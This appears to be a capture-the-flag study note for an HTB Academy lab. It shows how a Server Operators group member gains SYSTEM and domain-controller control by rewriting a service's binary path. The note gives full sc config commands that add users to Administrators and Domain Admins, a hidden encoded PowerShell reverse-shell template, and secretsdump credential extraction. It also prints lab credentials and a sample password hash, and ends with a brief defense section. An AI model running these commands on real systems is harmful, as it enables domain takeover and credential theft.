# Server Operators Privilege Escalation

## üéØ Overview

**Server Operators** group allows administration of Windows servers without Domain Admin privileges. Members can **log in locally to Domain Controllers** and have **full control over local services**, enabling privilege escalation through **service binary path modification**.

## üîë Key Privileges & Capabilities

```cmd
# Server Operators privileges:
SeBackupPrivilege            # Backup files and directories
SeRestorePrivilege           # Restore files and directories
SERVICE_ALL_ACCESS           # Full control over local services
# Plus: Log on locally to servers/DCs, control services
```

## üîß Service Control Exploitation

### Service Reconnaissance
```cmd
# Query service configuration
sc qc AppReadiness

# Expected output:
SERVICE_NAME: AppReadiness
TYPE               : 20  WIN32_SHARE_PROCESS
START_TYPE         : 3   DEMAND_START
BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
SERVICE_START_NAME : LocalSystem
```

### Verify Service Permissions
```cmd
# Check service permissions with PsService
c:\Tools\PsService.exe security AppReadiness

# Key permission:
[ALLOW] BUILTIN\Server Operators
        All                    # ‚Üê SERVICE_ALL_ACCESS
```

## üöÄ Binary Path Attack

### Current Admin Group Check
```cmd
# Check current administrators group
net localgroup Administrators

# Expected members:
Administrator
Domain Admins
Enterprise Admins
```

### Modify Service Binary Path
```cmd
# Change binary path to add user to local admins
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

# Expected result:
[SC] ChangeServiceConfig SUCCESS
```

### Execute Service (Expected to Fail)
```cmd
# Start service to execute command
sc start AppReadiness

# Expected failure:
[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.
```

### Verify Privilege Escalation
```cmd
# Check administrators group membership
net localgroup Administrators

# New member added:
Administrator
Domain Admins
Enterprise Admins
server_adm                    # ‚Üê Successfully added
```

## üéØ HTB Academy Lab Solution

### Lab Environment
- **Credentials**: `server_adm:HTB_@cademy_stdnt!`
- **Access Method**: RDP
- **Target Service**: AppReadiness
- **Flag Location**: `c:\Users\Administrator\Desktop\ServerOperators\flag.txt`

### Quick Steps
```cmd
# 1. RDP connect and verify current permissions
net localgroup Administrators

# 2. Modify AppReadiness service binary path
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

# 3. Start service (will fail but execute command)
sc start AppReadiness

# 4. Verify local admin access
net localgroup Administrators

# 5. Access flag as local administrator
type c:\Users\Administrator\Desktop\ServerOperators\flag.txt
```

## üèÜ Post-Exploitation Capabilities

### Domain Controller Access
```bash
# Verify Domain Controller access with crackmapexec
crackmapexec smb TARGET_IP -u server_adm -p 'HTB_@cademy_stdnt!'

# Expected result:
SMB         TARGET_IP     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

### Domain Credential Extraction
```bash
# Extract domain credentials using secretsdump.py
secretsdump.py server_adm@TARGET_IP -just-dc-user administrator

# Extract Administrator hash:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

## üîÑ Alternative Attack Vectors

### Other Target Services
```cmd
# Identify other controllable services
sc query state= all | findstr "SERVICE_NAME"

# Common targets with SYSTEM privileges:
- Themes
- BITS
- Schedule
- EventLog
```

### Alternative Payloads
```cmd
# Reverse shell payload
sc config SERVICE binPath= "cmd /c powershell -nop -w hidden -e BASE64_PAYLOAD"

# Add domain admin
sc config SERVICE binPath= "cmd /c net group 'Domain Admins' server_adm /add /domain"
```

## ‚ö†Ô∏è Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Service configuration changes (Event ID 7040)
- Unexpected local group modifications
- Service start failures with privilege escalation
- Binary path modifications to cmd.exe
```

### Defensive Measures
```cmd
# Mitigation strategies:
- Limit Server Operators group membership
- Monitor service configuration changes
- Implement service hardening
- Use least-privilege principles
```

## üí° Key Takeaways

1. **Server Operators** group provides **SERVICE_ALL_ACCESS** over local services
2. **Binary path modification** enables command execution as **SYSTEM**
3. **Local administrator access** leads to **Domain Controller compromise**
4. **SeBackupPrivilege** provides additional attack vectors
5. **High-impact group** requiring careful access control

*Server Operators group exploitation leverages service control capabilities for immediate local administrator access and potential domain compromise.*
